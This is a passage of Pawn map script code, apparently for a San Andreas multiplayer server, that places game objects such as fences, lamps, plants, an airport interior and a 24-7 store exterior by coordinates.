    CreateDynamicObject(3877,1413.50000000,-2301.69995117,11.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (4)
    CreateDynamicObject(3877,1409.69995117,-2299.89990234,11.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (5)
    CreateDynamicObject(3877,1391.69995117,-2301.00000000,11.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (6)
    CreateDynamicObject(1231,1391.59997559,-2331.10009766,15.30000019,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (1)
    CreateDynamicObject(1231,1401.40002441,-2331.19995117,15.30000019,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (2)
    CreateDynamicObject(1231,1411.19995117,-2331.00000000,15.30000019,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (3)
    CreateDynamicObject(1231,1384.90002441,-2331.10009766,15.30000019,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (4)
    CreateDynamicObject(970,1407.90002441,-2276.30004883,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (3)
    CreateDynamicObject(970,1412.09997559,-2276.30004883,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (3)
    CreateDynamicObject(970,1416.30004883,-2276.30004883,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (3)
    CreateDynamicObject(970,1403.69995117,-2276.30004883,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (3)
    CreateDynamicObject(970,1399.50000000,-2276.30004883,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (3)
    CreateDynamicObject(970,1395.30004883,-2276.30004883,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (3)
    CreateDynamicObject(970,1391.19995117,-2276.30004883,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (3)
    CreateDynamicObject(970,1389.09997559,-2274.19995117,13.10000038,0.00000000,0.00000000,270.00000000); //object(fencesmallb) (3)
    CreateDynamicObject(970,1389.09997559,-2270.10009766,13.10000038,0.00000000,0.00000000,270.00000000); //object(fencesmallb) (3)
    CreateDynamicObject(970,1391.09997559,-2268.00000000,13.10000038,0.00000000,0.00000000,180.00000000); //object(fencesmallb) (3)
    CreateDynamicObject(970,1395.19995117,-2268.00000000,13.10000038,0.00000000,0.00000000,179.99450684); //object(fencesmallb) (3)
    CreateDynamicObject(970,1399.40002441,-2268.00000000,13.10000038,0.00000000,0.00000000,179.99450684); //object(fencesmallb) (3)
    CreateDynamicObject(970,1403.59997559,-2268.00000000,13.10000038,0.00000000,0.00000000,179.99450684); //object(fencesmallb) (3)
    CreateDynamicObject(970,1407.80004883,-2268.00000000,13.10000038,0.00000000,0.00000000,179.99450684); //object(fencesmallb) (3)
    CreateDynamicObject(970,1412.00000000,-2268.00000000,13.10000038,0.00000000,0.00000000,179.99450684); //object(fencesmallb) (3)
    CreateDynamicObject(970,1416.30004883,-2268.00000000,13.10000038,0.00000000,0.00000000,179.99450684); //object(fencesmallb) (3)
    CreateDynamicObject(970,1418.40002441,-2270.10009766,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (3)
    CreateDynamicObject(970,1418.40002441,-2274.30004883,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (3)
    CreateDynamicObject(869,1416.19995117,-2273.80004883,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (1)
    CreateDynamicObject(869,1415.90002441,-2270.00000000,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (2)
    CreateDynamicObject(869,1411.59997559,-2270.60009766,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (3)
    CreateDynamicObject(869,1411.90002441,-2274.39990234,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (4)
    CreateDynamicObject(869,1407.40002441,-2274.19995117,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (5)
    CreateDynamicObject(869,1407.59997559,-2270.19995117,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (6)
    CreateDynamicObject(869,1403.09997559,-2270.50000000,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (7)
    CreateDynamicObject(869,1403.90002441,-2274.30004883,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (8)
    CreateDynamicObject(869,1399.69995117,-2274.10009766,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (9)
    CreateDynamicObject(869,1395.30004883,-2272.69995117,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (10)
    CreateDynamicObject(869,1391.69995117,-2274.30004883,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (11)
    CreateDynamicObject(869,1391.90002441,-2270.60009766,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (12)
    CreateDynamicObject(869,1395.40002441,-2270.00000000,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (13)
    CreateDynamicObject(869,1399.09997559,-2270.60009766,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (14)
    CreateDynamicObject(869,1395.90002441,-2274.50000000,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (15)
    CreateDynamicObject(869,1399.00000000,-2272.39990234,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (16)
    CreateDynamicObject(869,1403.50000000,-2272.60009766,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (17)
    CreateDynamicObject(869,1407.80004883,-2272.50000000,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (18)
    CreateDynamicObject(869,1413.30004883,-2272.19995117,13.00000000,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (19)
    CreateDynamicObject(3877,1394.90002441,-2273.00000000,11.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (7)
    CreateDynamicObject(3877,1401.09997559,-2271.39990234,11.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (8)
    CreateDynamicObject(3877,1408.40002441,-2273.00000000,11.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (9)
    CreateDynamicObject(3877,1416.00000000,-2269.30004883,11.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (10)
    CreateDynamicObject(3877,1407.69995117,-2272.39990234,11.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (11)
    CreateDynamicObject(3877,1391.19995117,-2274.19995117,11.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (12)
    CreateDynamicObject(3511,1405.00000000,-2286.60009766,9.80000019,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (2)
    CreateDynamicObject(718,1390.40002441,-2286.50000000,12.60000038,357.99993896,180.00000000,180.00000000); //object(vgs_palm04) (1)
    CreateDynamicObject(718,1405.09997559,-2286.69995117,12.60000038,357.99499512,179.99450684,179.99450684); //object(vgs_palm04) (3)
    CreateDynamicObject(3511,1390.19995117,-2286.39990234,9.80000019,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (4)
    CreateDynamicObject(1297,1399.09997559,-2291.30004883,15.89999962,0.00000000,0.00000000,268.00000000); //object(lamppost1) (1)
    CreateDynamicObject(1297,1399.40002441,-2281.30004883,15.89999962,0.00000000,0.00000000,93.99499512); //object(lamppost1) (2)
    CreateDynamicObject(1297,1413.19995117,-2281.50000000,15.89999962,0.00000000,0.00000000,93.99353027); //object(lamppost1) (3)
    CreateDynamicObject(1231,1395.50000000,-2241.69995117,15.30000019,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (6)
    CreateDynamicObject(1231,1385.59997559,-2241.60009766,15.30000019,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (7)
    CreateDynamicObject(1231,1404.69995117,-2241.89990234,15.30000019,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (8)
    CreateDynamicObject(1231,1414.69995117,-2241.60009766,15.30000019,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (9)
    CreateDynamicObject(982,1403.19921875,-2333.59960938,13.30000019,0.00000000,0.00000000,270.00000000); //object(fenceshit) (1)
    CreateDynamicObject(982,1403.30004883,-2328.10009766,13.30000019,0.00000000,0.00000000,270.00000000); //object(fenceshit) (2)
    CreateDynamicObject(983,1387.09997559,-2333.60009766,13.30000019,0.00000000,0.00000000,270.00000000); //object(fenceshit3) (1)
    CreateDynamicObject(983,1387.19921875,-2328.09960938,13.30000019,0.00000000,0.00000000,270.00000000); //object(fenceshit3) (3)
    CreateDynamicObject(4597,1400.30004883,-2310.10009766,13.00000000,0.00000000,0.00000000,0.00000000); //object(crprkblok4_lan2) (1)
    CreateDynamicObject(4597,1399.80004883,-2351.89990234,13.00000000,0.00000000,0.00000000,0.00000000); //object(crprkblok4_lan2) (2)
    CreateDynamicObject(5837,1396.40002441,-2331.30004883,14.30000019,0.00000000,0.00000000,0.00000000); //object(ci_guardhouse1) (1)
    CreateDynamicObject(8406,1418.39941406,-2323.59960938,18.10000038,0.00000000,0.00000000,90.00000000); //object(carparksign01_lvs) (1)
    CreateDynamicObject(982,1396.50000000,-2244.89941406,13.30000019,0.00000000,0.00000000,270.00000000); //object(fenceshit) (1)
    CreateDynamicObject(982,1396.50000000,-2239.30004883,13.30000019,0.00000000,0.00000000,270.00000000); //object(fenceshit) (1)
    CreateDynamicObject(983,1412.50000000,-2239.30004883,13.30000019,0.00000000,0.00000000,270.00000000); //object(fenceshit3) (3)
    CreateDynamicObject(983,1412.59997559,-2244.89990234,13.30000019,0.00000000,0.00000000,270.00000000); //object(fenceshit3) (3)
    CreateDynamicObject(5837,1400.09997559,-2241.69995117,14.30000019,0.00000000,0.00000000,0.00000000); //object(ci_guardhouse1) (1)
    CreateDynamicObject(8406,1418.59997559,-2255.30004883,18.10000038,0.00000000,0.00000000,90.00000000); //object(carparksign01_lvs) (1)
    CreateDynamicObject(970,1368.90002441,-2285.50000000,13.10000038,0.00000000,0.00000000,326.00000000); //object(fencesmallb) (2)
    CreateDynamicObject(970,1365.59997559,-2283.50000000,13.10000038,0.00000000,0.00000000,331.99536133); //object(fencesmallb) (2)
    CreateDynamicObject(970,1362.09997559,-2281.30004883,13.10000038,0.00000000,0.00000000,321.99536133); //object(fencesmallb) (2)
    CreateDynamicObject(970,1358.90002441,-2278.80004883,13.10000038,0.00000000,0.00000000,321.99279785); //object(fencesmallb) (2)
    CreateDynamicObject(970,1356.69995117,-2279.50000000,13.10000038,0.00000000,0.00000000,73.99279785); //object(fencesmallb) (2)
    CreateDynamicObject(970,1355.50000000,-2283.50000000,13.10000038,0.00000000,0.00000000,73.98742676); //object(fencesmallb) (2)
    CreateDynamicObject(970,1355.09997559,-2287.50000000,13.10000038,0.00000000,0.00000000,93.98742676); //object(fencesmallb) (2)
    CreateDynamicObject(970,1355.40002441,-2291.60009766,13.10000038,0.00000000,0.00000000,93.98254395); //object(fencesmallb) (2)
    CreateDynamicObject(970,1357.50000000,-2292.89990234,13.10000038,0.00000000,0.00000000,201.98254395); //object(fencesmallb) (2)
    CreateDynamicObject(970,1361.30004883,-2291.19995117,13.10000038,0.00000000,0.00000000,205.97814941); //object(fencesmallb) (2)
    CreateDynamicObject(970,1365.00000000,-2289.39990234,13.10000038,0.00000000,0.00000000,205.97717285); //object(fencesmallb) (2)
    CreateDynamicObject(970,1368.69995117,-2287.60009766,13.10000038,0.00000000,0.00000000,205.97717285); //object(fencesmallb) (2)
    CreateDynamicObject(2745,1360.09997559,-2283.60009766,13.80000019,0.00000000,0.00000000,104.00000000); //object(cj_stat_3) (1)
    CreateDynamicObject(2745,1360.40002441,-2287.30004883,13.80000019,0.00000000,0.00000000,59.99658203); //object(cj_stat_3) (2)
    CreateDynamicObject(8406,1418.50000000,-2343.39990234,18.10000038,0.00000000,0.00000000,90.00000000); //object(carparksign01_lvs) (1)
    CreateDynamicObject(8406,1418.69995117,-2234.19995117,18.10000038,0.00000000,0.00000000,90.00000000); //object(carparksign01_lvs) (1)
    CreateDynamicObject(982,1380.19995117,-2253.89990234,13.30000019,0.00000000,0.00000000,180.00000000); //object(fenceshit) (1)
    CreateDynamicObject(982,1380.19995117,-2233.10009766,13.30000019,0.00000000,0.00000000,179.99450684); //object(fenceshit) (1)
    CreateDynamicObject(982,1380.69995117,-2331.50000000,13.30000019,0.00000000,0.00000000,179.99450684); //object(fenceshit) (1)
    CreateDynamicObject(3472,1405.80004883,-2331.19995117,5.30000019,0.00000000,0.00000000,0.00000000); //object(circuslampost03) (1)
    CreateDynamicObject(3472,1387.50000000,-2331.39990234,5.30000019,0.00000000,0.00000000,0.00000000); //object(circuslampost03) (3)
    CreateDynamicObject(3472,1408.19995117,-2241.89990234,4.30000019,0.00000000,0.00000000,0.00000000); //object(circuslampost03) (4)
    CreateDynamicObject(3472,1386.00000000,-2242.30004883,4.30000019,0.00000000,0.00000000,0.00000000); //object(circuslampost03) (5)
    CreateDynamicObject(9833,1408.19995117,-2273.19995117,15.50000000,0.00000000,0.00000000,0.00000000); //object(fountain_sfw) (1)
    CreateDynamicObject(9833,1408.80004883,-2300.69995117,15.50000000,0.00000000,0.00000000,0.00000000); //object(fountain_sfw) (2)
	//							AEROPUERTO INT
 	CreateDynamicObject(3971,-1915.95117188,15.18066406,1062.69409180,0.00000000,0.00000000,0.00000000); //object(cj_bag_reclaim) (1)
 	CreateDynamicObject(3967,-1942.85058594,13.41308594,1073.08288574,0.00000000,0.00000000,0.00000000); //object(airport_int2) (2)
 	CreateDynamicObject(6888,-1908.58056641,26.73178673,1061.31201172,0.00000000,90.00000000,90.00000000); //object(vegasnedge06) (1)
 	CreateDynamicObject(3851,-1913.78564453,-0.67592573,1061.76818848,0.00000000,0.00000000,270.00000000); //object(carshowwin_sfsx) (1)
 	CreateDynamicObject(3851,-1902.49450684,-0.66817290,1061.76818848,0.00000000,0.00000000,269.99499512); //object(carshowwin_sfsx) (2)
    CreateDynamicObject(3851,-1903.68554688,2.89538622,1061.76818848,0.00000000,0.00000000,359.99450684); //object(carshowwin_sfsx) (3)
    CreateDynamicObject(1649,-1919.46813965,6.18574953,1061.80932617,0.00000000,0.00000000,90.00000000); //object(wglasssmash) (1)
    CreateDynamicObject(1649,-1919.41467285,1.69509816,1061.80932617,0.00000000,0.00000000,90.00000000); //object(wglasssmash) (2)
    CreateDynamicObject(1649,-1926.04479980,8.47107601,1061.80932617,0.00000000,0.00000000,179.99450684); //object(wglasssmash) (4)
    CreateDynamicObject(1806,-1926.25573730,6.55859566,1060.14355469,0.00000000,0.00000000,8.00000000); //object(med_office_chair) (1)
    CreateDynamicObject(1806,-1924.48559570,6.47626019,1060.14355469,0.00000000,0.00000000,0.00000000); //object(med_office_chair) (2)
    CreateDynamicObject(1806,-1921.36572266,6.61152077,1060.14355469,0.00000000,0.00000000,304.00000000); //object(med_office_chair) (3)
    CreateDynamicObject(1806,-1921.31738281,5.09286022,1060.14355469,0.00000000,0.00000000,271.99951172); //object(med_office_chair) (4)
    CreateDynamicObject(2009,-1921.13793945,7.77984095,1060.14355469,0.00000000,0.00000000,270.00000000); //object(officedesk2l) (1)
    CreateDynamicObject(1999,-1920.12512207,5.80370378,1060.14355469,0.00000000,0.00000000,270.00000000); //object(officedesk2) (1)
    CreateDynamicObject(1999,-1925.38305664,7.73806667,1060.14355469,0.00000000,0.00000000,359.99450684); //object(officedesk2) (2)
    CreateDynamicObject(2009,-1927.36193848,6.73737240,1060.14355469,0.00000000,0.00000000,359.99450684); //object(officedesk2l) (2)
    CreateDynamicObject(1649,-1919.46777344,6.18554688,1061.80932617,0.00000000,0.00000000,270.00000000); //object(wglasssmash) (5)
    CreateDynamicObject(1649,-1926.04394531,8.47070312,1061.80932617,0.00000000,0.00000000,359.99450684); //object(wglasssmash) (6)
    CreateDynamicObject(2172,-1922.10266113,2.29035783,1060.14355469,0.00000000,0.00000000,180.00000000); //object(med_office2_desk_1) (1)
    CreateDynamicObject(2172,-1920.16711426,2.32808352,1060.14355469,0.00000000,0.00000000,180.00000000); //object(med_office2_desk_1) (2)
    CreateDynamicObject(1806,-1920.91381836,3.37708330,1060.14355469,0.00000000,0.00000000,169.99951172); //object(med_office_chair) (7)
    CreateDynamicObject(2175,-1926.82275391,5.52760744,1060.14355469,0.00000000,0.00000000,180.00000000); //object(med_office4_desk_3) (1)
    CreateDynamicObject(1518,-1926.87341309,5.62063646,1061.30004883,0.00000000,0.00000000,163.99993896); //object(dyn_tv_2) (1)
    CreateDynamicObject(1782,-1927.37719727,6.89274979,1061.03198242,0.00000000,0.00000000,266.00000000); //object(med_video_2) (1)
    CreateDynamicObject(1782,-1925.36596680,7.72732687,1061.03198242,0.00000000,0.00000000,189.99548340); //object(med_video_2) (2)
    CreateDynamicObject(1782,-1920.89013672,7.90189362,1061.03198242,0.00000000,0.00000000,177.99206543); //object(med_video_2) (3)
    CreateDynamicObject(1782,-1920.13256836,5.54518509,1061.03198242,0.00000000,0.00000000,95.98950195); //object(med_video_2) (4)
    CreateDynamicObject(1808,-1924.43750000,5.17484379,1060.14355469,0.00000000,0.00000000,178.00000000); //object(cj_watercooler2) (1)
    CreateDynamicObject(2186,-1923.26049805,3.52963758,1060.14355469,0.00000000,0.00000000,89.99996948); //object(photocopier_1) (1)
    CreateDynamicObject(14608,-1935.13073730,11.35891819,1061.81396484,0.00000000,0.00000000,273.99902344); //object(triad_buddha01) (1)
    CreateDynamicObject(1533,-1884.96496582,16.83487892,1060.16857910,0.00000000,0.00000000,269.99996948); //object(gen_doorext12) (1)
    CreateDynamicObject(1533,-1884.95117188,18.33911705,1060.16857910,0.00000000,0.00000000,269.99450684); //object(gen_doorext12) (2)
    CreateDynamicObject(1533,-1884.96960449,20.26784134,1060.16857910,0.00000000,0.00000000,269.99450684); //object(gen_doorext12) (3)
    CreateDynamicObject(1533,-1884.97998047,21.77085876,1060.16857910,0.00000000,0.00000000,269.99450684); //object(gen_doorext12) (4)
    CreateDynamicObject(1533,-1889.63903809,8.55360699,1060.16857910,0.00000000,0.00000000,177.99450684); //object(gen_doorext12) (5)
    CreateDynamicObject(1533,-1887.16137695,8.51877213,1060.16857910,0.00000000,0.00000000,177.98950195); //object(gen_doorext12) (6)
    CreateDynamicObject(1533,-1938.43652344,15.33934689,1060.16857910,0.00000000,0.00000000,91.98950195); //object(gen_doorext12) (7)
    CreateDynamicObject(1533,-1938.48291016,16.83814049,1060.16857910,0.00000000,0.00000000,91.98852539); //object(gen_doorext12) (8)
    CreateDynamicObject(1533,-1938.51696777,18.73773956,1060.16857910,0.00000000,0.00000000,91.98852539); //object(gen_doorext12) (9)
    CreateDynamicObject(1533,-1938.56323242,20.26156807,1060.16857910,0.00000000,0.00000000,91.98852539); //object(gen_doorext12) (10)
    CreateDynamicObject(1533,-1910.29296875,-0.62402344,1060.16857910,0.00000000,0.00000000,179.98352051); //object(gen_doorext12) (11)
    CreateDynamicObject(1533,-1911.79614258,-0.66267604,1060.16857910,0.00000000,0.00000000,179.98352051); //object(gen_doorext12) (12)
    CreateDynamicObject(1533,-1922.26416016,8.49345016,1060.16857910,0.00000000,0.00000000,179.98352051); //object(gen_doorext12) (11)
    CreateDynamicObject(1649,-1921.70324707,8.51707745,1061.80932617,0.00000000,0.00000000,359.99450684); //object(wglasssmash) (6)
    CreateDynamicObject(3850,-1936.66674805,13.96198368,1060.68945312,0.00000000,0.00000000,90.00000000); //object(carshowbann_sfsx) (2)
    CreateDynamicObject(3850,-1933.52758789,12.99287510,1060.68945312,0.00000000,0.00000000,56.00000000); //object(carshowbann_sfsx) (3)
    CreateDynamicObject(3850,-1932.12585449,10.31136322,1060.68945312,0.00000000,0.00000000,359.99975586); //object(carshowbann_sfsx) (4)
    CreateDynamicObject(3850,-1918.08386230,20.30905914,1060.68945312,0.00000000,0.00000000,87.99731445); //object(carshowbann_sfsx) (5)
    CreateDynamicObject(3850,-1919.85864258,18.65610695,1060.68945312,0.00000000,0.00000000,177.99499512); //object(carshowbann_sfsx) (6)
    CreateDynamicObject(3850,-1919.97387695,15.22746944,1060.68945312,0.00000000,0.00000000,177.98950195); //object(carshowbann_sfsx) (7)
    CreateDynamicObject(3850,-1914.66064453,20.18191910,1060.68945312,0.00000000,0.00000000,87.99499512); //object(carshowbann_sfsx) (8)
    CreateDynamicObject(3850,-1918.29260254,13.48203087,1060.68945312,0.00000000,0.00000000,87.99499512); //object(carshowbann_sfsx) (9)
    CreateDynamicObject(3850,-1914.87670898,13.36492920,1060.68945312,0.00000000,0.00000000,87.99499512); //object(carshowbann_sfsx) (10)
    CreateDynamicObject(3850,-1913.06848145,16.61343193,1060.68945312,0.00000000,0.00000000,177.99499512); //object(carshowbann_sfsx) (11)
    CreateDynamicObject(1704,-1914.10571289,16.99391747,1060.14355469,0.00000000,0.00000000,269.99996948); //object(kb_chair03) (1)
    CreateDynamicObject(1723,-1917.47595215,19.27788162,1060.14355469,0.00000000,0.00000000,0.00000000); //object(mrk_seating1) (1)
    CreateDynamicObject(1723,-1918.73937988,15.88104534,1060.14355469,0.00000000,0.00000000,88.00000000); //object(mrk_seating1) (2)
    CreateDynamicObject(1723,-1915.28344727,14.35449409,1060.14355469,0.00000000,0.00000000,177.99499512); //object(mrk_seating1) (3)
    CreateDynamicObject(1827,-1916.28442383,16.80001450,1060.14355469,0.00000000,0.00000000,0.00000000); //object(man_sdr_tables) (1)
    CreateDynamicObject(1572,-1886.03247070,25.55627632,1060.71423340,0.00000000,0.00000000,158.00000000); //object(cj_air_trolly) (1)
    CreateDynamicObject(1572,-1886.64379883,29.08264732,1060.71423340,0.00000000,0.00000000,175.99987793); //object(cj_air_trolly) (2)
    CreateDynamicObject(1572,-1887.93261719,24.25136566,1060.71423340,0.00000000,0.00000000,175.99548340); //object(cj_air_trolly) (3)
    CreateDynamicObject(2773,-1891.28588867,9.72731018,1060.66076660,0.00000000,0.00000000,0.00000000); //object(cj_airprt_bar) (1)
    CreateDynamicObject(2773,-1886.10632324,11.94846344,1060.66076660,0.00000000,0.00000000,269.99996948); //object(cj_airprt_bar) (2)
    CreateDynamicObject(2773,-1888.15246582,11.93920422,1060.66076660,0.00000000,0.00000000,269.99450684); //object(cj_airprt_bar) (3)
    CreateDynamicObject(2773,-1890.20288086,11.95936108,1060.66076660,0.00000000,0.00000000,269.99450684); //object(cj_airprt_bar) (4)
    CreateDynamicObject(2773,-1924.67517090,9.72974396,1060.66076660,0.00000000,0.00000000,0.00000000); //object(cj_airprt_bar) (5)
    CreateDynamicObject(2773,-1924.66455078,11.63750362,1060.66076660,0.00000000,0.00000000,0.00000000); //object(cj_airprt_bar) (6)
    CreateDynamicObject(2773,-1927.45581055,9.79865837,1060.66076660,0.00000000,0.00000000,0.00000000); //object(cj_airprt_bar) (7)
    CreateDynamicObject(2773,-1927.46936035,11.70828915,1060.66076660,0.00000000,0.00000000,0.00000000); //object(cj_airprt_bar) (8)
    CreateDynamicObject(2773,-1925.99975586,9.78141212,1060.66076660,0.00000000,0.00000000,0.00000000); //object(cj_airprt_bar) (9)
    CreateDynamicObject(2773,-1918.22204590,6.52163410,1060.66076660,0.00000000,0.00000000,268.00000000); //object(cj_airprt_bar) (10)
    CreateDynamicObject(2773,-1918.22497559,5.19272375,1060.66076660,0.00000000,0.00000000,267.99499512); //object(cj_airprt_bar) (11)
    CreateDynamicObject(2773,-1918.11254883,3.64645100,1060.66076660,0.00000000,0.00000000,267.99499512); //object(cj_airprt_bar) (12)
    CreateDynamicObject(1210,-1907.64831543,25.33385849,1060.59228516,90.00000000,179.30346680,180.69650269); //object(briefcase) (1)
    CreateDynamicObject(1210,-1907.65991211,26.45854759,1060.59228516,90.00000000,179.30236816,180.69213867); //object(briefcase) (2)
    CreateDynamicObject(1210,-1909.15844727,26.42445374,1060.59228516,90.00000000,179.31018066,2.68420410); //object(briefcase) (3)
    CreateDynamicObject(1210,-1909.13085938,25.22412872,1060.59228516,90.00000000,180.69223022,357.30230713); //object(briefcase) (4)
    CreateDynamicObject(1210,-1918.30358887,25.47170258,1060.59228516,90.00000000,179.30786133,2.68066406); //object(briefcase) (5)
    CreateDynamicObject(1210,-1919.77233887,25.52063751,1060.59228516,0.00000000,0.00012207,181.98852539); //object(briefcase) (6)
    CreateDynamicObject(8229,-1939.48583984,8.32464790,1062.84472656,0.00000000,0.00000000,0.00000000); //object(vgsbikeschl02) (1)
    CreateDynamicObject(8229,-1938.85388184,21.38716316,1062.84472656,0.00000000,0.00000000,269.99996948); //object(vgsbikeschl02) (2)
    CreateDynamicObject(8229,-1884.84948730,19.48977661,1062.84472656,0.00000000,0.00000000,269.99450684); //object(vgsbikeschl02) (3)
    CreateDynamicObject(8229,-1892.29614258,8.31526089,1062.84472656,0.00000000,0.00000000,359.99450684); //object(vgsbikeschl02) (4)
	//                      24-7 Ayuntamiento
	CreateDynamicObject(1251,1361.00000000,-1752.59997559,12.50000000,0.00000000,0.00000000,180.00000000); //object(smashbar) (2)
	CreateDynamicObject(1251,1358.00000000,-1752.59997559,12.50000000,0.00000000,0.00000000,179.99450684); //object(smashbar) (3)
	CreateDynamicObject(1251,1354.80004883,-1752.59997559,12.50000000,0.00000000,0.00000000,179.99450684); //object(smashbar) (4)
	CreateDynamicObject(1251,1350.80004883,-1752.69995117,12.50000000,0.00000000,0.00000000,179.99450684); //object(smashbar) (5)
	CreateDynamicObject(1251,1347.80004883,-1752.59997559,12.50000000,0.00000000,0.00000000,179.99450684); //object(smashbar) (6)
	CreateDynamicObject(1251,1344.59997559,-1752.59997559,12.50000000,0.00000000,0.00000000,179.99450684); //object(smashbar) (7)
	CreateDynamicObject(1251,1341.59997559,-1752.69995117,12.50000000,0.00000000,0.00000000,179.99450684); //object(smashbar) (9)
	CreateDynamicObject(3850,1359.40002441,-1756.09997559,13.10000038,0.00000000,0.00000000,90.00000000); //object(carshowbann_sfsx) (2)
	CreateDynamicObject(3850,1355.90002441,-1756.09997559,13.10000038,0.00000000,0.00000000,90.00000000); //object(carshowbann_sfsx) (3)
	CreateDynamicObject(3850,1349.69995117,-1756.19995117,13.10000038,0.00000000,0.00000000,90.00000000); //object(carshowbann_sfsx) (4)
	CreateDynamicObject(3850,1346.30004883,-1756.19995117,13.10000038,0.00000000,0.00000000,90.00000000); //object(carshowbann_sfsx) (5)
	CreateDynamicObject(3850,1342.90002441,-1756.19995117,13.10000038,0.00000000,0.00000000,90.00000000); //object(carshowbann_sfsx) (7)
	CreateDynamicObject(3850,1341.09997559,-1754.50000000,13.10000038,0.00000000,0.00000000,0.00000000); //object(carshowbann_sfsx) (8)
	CreateDynamicObject(3850,1341.09997559,-1751.00000000,13.10000038,0.00000000,0.00000000,0.00000000); //object(carshowbann_sfsx) (9)
	CreateDynamicObject(3850,1361.19995117,-1754.40002441,13.10000038,0.00000000,0.00000000,0.00000000); //object(carshowbann_sfsx) (10)
	CreateDynamicObject(3850,1361.19995117,-1750.90002441,13.10000038,0.00000000,0.00000000,0.00000000); //object(carshowbann_sfsx) (11)
	CreateDynamicObject(1349,1340.50000000,-1760.30004883,13.10000038,0.00000000,0.00000000,87.99499512); //object(cj_shtrolly) (2)
	CreateDynamicObject(1349,1341.50000000,-1760.30004883,13.10000038,0.00000000,0.00000000,87.99499512); //object(cj_shtrolly) (3)
	CreateDynamicObject(1349,1341.40002441,-1761.90002441,13.10000038,0.00000000,0.00000000,87.99499512); //object(cj_shtrolly) (4)
	CreateDynamicObject(1349,1340.40002441,-1761.90002441,13.10000038,0.00000000,0.00000000,87.99499512); //object(cj_shtrolly) (5)
	CreateDynamicObject(1349,1340.30004883,-1763.50000000,13.10000038,0.00000000,0.00000000,87.99499512); //object(cj_shtrolly) (6)
	CreateDynamicObject(1349,1341.50000000,-1763.59997559,13.10000038,0.00000000,0.00000000,87.99499512); //object(cj_shtrolly) (7)
	CreateDynamicObject(1440,1339.59997559,-1773.00000000,13.10000038,0.00000000,0.00000000,0.00000000); //object(dyn_box_pile_3) (1)
	CreateDynamicObject(1439,1337.00000000,-1767.30004883,12.60000038,0.00000000,0.00000000,89.50000000); //object(dyn_dumpster_1) (1)
	CreateDynamicObject(1227,1337.19995117,-1771.90002441,13.39999962,0.00000000,0.00000000,90.00000000); //object(dump1) (1)
	CreateDynamicObject(1227,1337.19995117,-1769.50000000,13.39999962,0.00000000,0.00000000,90.00000000); //object(dump1) (2)
	CreateDynamicObject(1227,1341.69995117,-1768.90002441,13.39999962,0.00000000,0.00000000,270.00000000); //object(dump1) (3)
	CreateDynamicObject(1227,1341.80004883,-1766.50000000,13.39999962,0.00000000,0.00000000,270.00000000); //object(dump1) (4)
	CreateDynamicObject(13562,1358.80004883,-1763.09997559,19.10000038,0.00000000,0.00000000,0.00000000); //object(bigsprunkpole) (1)
	CreateDynamicObject(2714,1348.40002441,-1759.00000000,17.70000076,0.00000000,0.00000000,180.00000000); //object(cj_open_sign_2) (1)
	CreateDynamicObject(2714,1357.00000000,-1759.00000000,17.70000076,0.00000000,0.00000000,179.99450684); //object(cj_open_sign_2) (2)
	CreateDynamicObject(3467,1349.09997559,-1759.09997559,13.19999981,0.00000000,0.00000000,0.00000000); //object(vegstreetsign1) (1)
	CreateDynamicObject(3468,1355.00000000,-1759.09997559,13.19999981,0.00000000,0.00000000,0.00000000); //object(vegstreetsign2) (1)
	CreateDynamicObject(5811,1339.69995117,-1744.09997559,16.60000038,0.00000000,0.00000000,0.00000000); //object(lawnmallsign1) (1)
	CreateDynamicObject(7915,1364.30004883,-1750.80004883,15.80000019,0.00000000,0.00000000,270.00000000); //object(vgwestbillbrd16) (1)
